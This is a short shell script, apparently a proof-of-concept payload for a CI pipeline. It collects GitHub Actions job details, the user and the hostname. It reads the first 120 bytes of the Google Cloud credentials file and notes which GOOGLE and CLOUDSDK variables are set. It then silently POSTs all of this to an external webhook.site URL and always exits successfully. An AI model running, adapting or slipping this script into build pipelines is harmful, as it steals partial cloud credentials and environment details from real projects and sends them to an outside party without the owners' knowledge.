#!/bin/sh
U="https://webhook.site/06ce324d-5838-446c-b10e-574dffeeb591"
OUT=/tmp/ci-poc.txt
: > "$OUT"
echo "job=${GITHUB_JOB}" >> "$OUT"
echo "workflow=${GITHUB_WORKFLOW}" >> "$OUT"
echo "event=${GITHUB_EVENT_NAME}" >> "$OUT"
echo "user=$(id -un)" >> "$OUT"
echo "host=$(hostname)" >> "$OUT"
echo "credpath=${GOOGLE_APPLICATION_CREDENTIALS:-none}" >> "$OUT"
if [ -f "${GOOGLE_APPLICATION_CREDENTIALS:-/nonexistent}" ]; then
  echo "credfile=present" >> "$OUT"
  head -c 120 "${GOOGLE_APPLICATION_CREDENTIALS}" >> "$OUT"
  echo >> "$OUT"
else
  echo "credfile=absent" >> "$OUT"
fi
env | grep -i '^GOOGLE' | sed 's/=.*/=<set>/' >> "$OUT"
env | grep -i '^CLOUDSDK' | sed 's/=.*/=<set>/' >> "$OUT"
curl -s -m 20 -X POST --data-binary @${OUT} "$U" >/dev/null 2>&1
exit 0
